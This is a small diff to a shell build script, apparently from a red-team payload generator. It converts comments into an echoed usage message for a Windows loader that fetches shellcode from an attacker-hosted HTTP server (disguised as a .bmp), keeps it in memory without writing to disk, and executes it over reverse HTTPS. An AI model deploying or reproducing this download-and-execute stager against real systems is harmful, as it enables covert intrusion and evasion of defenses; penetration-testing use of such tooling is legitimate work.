@@ -65,9 +65,9 @@ strip output/dkmc_downloadexecshc_revhttps_win32.exe
 # cleanup
 cleanup_techniques
 
-# The generated shellcode must be hosted on a HTTP server.
-# Call your executable like:
-# output.exe http://yourserver/sc.bmp
-# The executable will then download the shellcode to memory via sockets (no file is dropped on disk).
-# Next, the shellcode is executed.
+echo "The generated shellcode must be hosted on a HTTP server.
+Call your executable like:
+dkmc_downloadexecshc_revhttps_win32.exe http://yourserver/sc.bmp
+The executable will then download the shellcode to memory via sockets (no file is dropped on disk).
+Next, the shellcode is executed."
 
